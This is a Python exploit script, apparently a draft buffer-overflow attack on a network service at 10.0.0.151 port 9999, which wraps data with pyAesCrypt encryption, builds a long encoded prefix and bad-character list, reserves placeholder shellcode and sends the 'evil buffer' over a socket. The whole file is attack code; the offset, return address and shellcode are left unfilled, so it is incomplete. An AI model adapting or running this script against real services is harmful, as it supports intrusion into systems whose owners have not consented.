
import socket,pyAesCrypt,io

ip = "10.0.0.151"
port = 9999
def encryptData(buff):
	pbdata = str.encode(buff)
	fIn = io.BytesIO(pbdata)
	fCiph = io.BytesIO()
	pyAesCrypt.encryptStream(fIn, fCiph, 'password', 4096)
	dataToSend = fCiph.getvalue()
	return dataToSend

prefix = "VVZWb1NWTkZhRWxUUldoSlUwVm9TVk5GYUVsVFJXaEpVbFZ3U1ZaRmNFeFRNSFJNVXpCMFRGTXdkRXhUTUhSTVV6QjBURk13ZEV4U1ZYaE5WRVY0VFZSRmVFMVVSWGhOVkVWNFRWUkZlRkpVUlhoTlZFVjRUVlJGZUUxVVJYaE5WRVY0VVZGVlJrSlJWVVpDVVZWR1FsRlZSa0pSVm1oaFYyeHdZVmRzY0dGWGJIQmhWMnh3WVZkc2NHRlhiSEJoVjJzMVdWZEdhRmxYUm1oWlYwWm9XVmRHYUZsWFJtaFpWMFpuUzFGVmFFbFRSV2hKVTBWb1NWTkZhRWxUUldoSlUwVm9TVkpWY0VsV1JYQk1VekIwVEZNd2RFeFRNSFJNVXpCMFRGTXdkRXhUTUhSTVVsVjRUVlJGZUUxVVJYaE5WRVY0VFZSRmVFMVVSWGhTVkVWNFRWUkZlRTFVUlhoTlZFVjRUVlJGZUZGUlZVWkNVVlZHUWxGVlJrSlJWVVpDVVZab1lWZHNjR0ZYYkhCaFYyeHdZVmRzY0dGWGJIQmhWMnh3WVZkck5WbFhSbWhaVjBab1dWZEdhRmxYUm1oWlYwWm9XVmRHWjB0UlZXaEpVMFZvU1ZORmFFbFRSV2hKVTBWb1NWTkZhRWxTVlhCSlZrVndURk13ZEV4VE1IUk1VekIwVEZNd2RFeFRNSFJNVXpCMFRGSlZlRTFVUlhoTlZFVjRUVlJGZUUxVVJYaE5WRVY0VWxSRmVFMVVSWGhOVkVWNFRWUkZlRTFVUlhoUlVWVkdRbEZWUmtKUlZVWkNVVlZHUWxGV2FHRlhiSEJoVjJ4d1lWZHNjR0ZYYkhCaFYyeHdZVmRzY0dGWGF6VlpWMFpvV1ZkR2FGbFhSbWhaVjBab1dWZEdhRmxYUm1kTFVWVm9TVk5GYUVsVFJXaEpVMFZvU1ZORmFFbFRSV2hKVWxWd1NWWkZjRXhUTUhSTVV6QjBURk13ZEV4VE1IUk1VekIwVEZNd2RFeFNWWGhOVkVWNFRWUkZlRTFVUlhoTlZFVjRUVlJGZUZKVVJYaE5WRVY0VFZSRmVFMVVSWGhOVkVWNFVWRlZSa0pSVlVaQ1VWVkdRbEZWUmtKUlZtaGhWMnh3WVZkc2NHRlhiSEJoVjJ4d1lWZHNjR0ZYYkhCaFYyczFXVmRHYUZsWFJtaFpWMFpvV1ZkR2FGbFhSbWhaVjBablMyTXlWbWhhYlRsMFpVZGFiR016Wkd4amJtUjNURWRrYkdOdFkwdGtTRWxMWkVoS2IyUkliSGxoYlZaNVdtMXZTMlJIVGpCak1sRkxZek5vTUdOdFowdGpibEpyUTIxdlMyVlhiMHRrUjNBd1pWZHdNR1ZZYkd0bFdGSnVXbTF3TldSSFduRmxXRkpyWVcxb05XUkhValZrUjFKeFpWaFNOV1JIVW5GbFdGSnhXa2hzTUVOblBUMD0="
offset = 10
buffer = str(encryptData('hjhhjjhh'))
retn = ""
padding = ""
shellcode = "XXXX"*170


t = encryptData('doesntmatterthedata')
t = str(t).replace('CREATED_BY\\','').replace('pyAesCrypt 6.','').replace('AES','').replace('b','').replace('\'','').replace('\\x00','')

bad_char_gen = bytearray(range(0,256))
char_enum = [b"\x00"]
for bad in char_enum:
            bad_char_gen = bad_char_gen.replace(bad,b"")
payload2 = str(bad_char_gen)
payload = prefix
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(payload + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
